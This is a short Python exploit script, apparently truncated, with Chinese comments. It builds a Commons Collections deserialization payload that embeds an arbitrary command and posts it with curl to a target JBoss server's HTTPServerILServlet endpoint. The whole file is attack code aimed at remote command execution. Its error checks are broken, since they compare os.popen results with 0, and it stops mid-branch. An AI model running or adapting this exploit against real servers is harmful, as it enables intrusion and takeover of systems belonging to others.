import os


class Victim:
    #初始化
    def __init__(self,target_url,command):
        self.target_url = target_url
        self.command    = command

    #设置路径
    def SetH2HC(self,path):
        self.path = path

    #创建expolit
    def Expolit_Create(self):
        os.chdir(self.path)
        a = os.popen('javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java')
        #判断是否出错 进行payload创建
        if a != 0:
            print('we got problems:Payload Creating failed')
            exit(1)
        else :
            b = os.popen('java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap '+ '\"' + self.command +'\"')
        if b == 0:
            print('Payload Created Successfully!')

    def Attack(self):
        a = os.popen('curl ' + self.target_url + '/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser')
        if a !=0:
            print('we got problems:Attack failed')
            exit(1)
        else:
